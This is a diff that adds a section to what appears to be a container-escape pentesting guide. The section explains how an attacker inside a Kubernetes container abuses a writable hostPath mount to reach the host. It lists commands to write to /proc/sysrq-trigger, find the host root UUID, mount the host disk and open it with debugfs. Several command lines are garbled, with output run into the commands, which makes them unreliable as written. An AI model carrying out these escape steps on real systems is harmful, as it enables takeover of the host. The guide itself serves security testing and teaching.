@@ -470,6 +470,24 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 
+## Writable hostPath Mount
+
+\(Info from [**here**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)\) Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
+
+```bash
+#### Check if You Can Write to a File-system
+$ echo 1 > /proc/sysrq-trigger
+
+#### Check root UUID
+$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
+$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
+$ mkdir /mnt-test
+$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.
+
+#### debugfs (Interactive File System Debugger)
+$ debugfs /dev/sda1
+```
+
 ## Seccomp in Docker
 
 This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
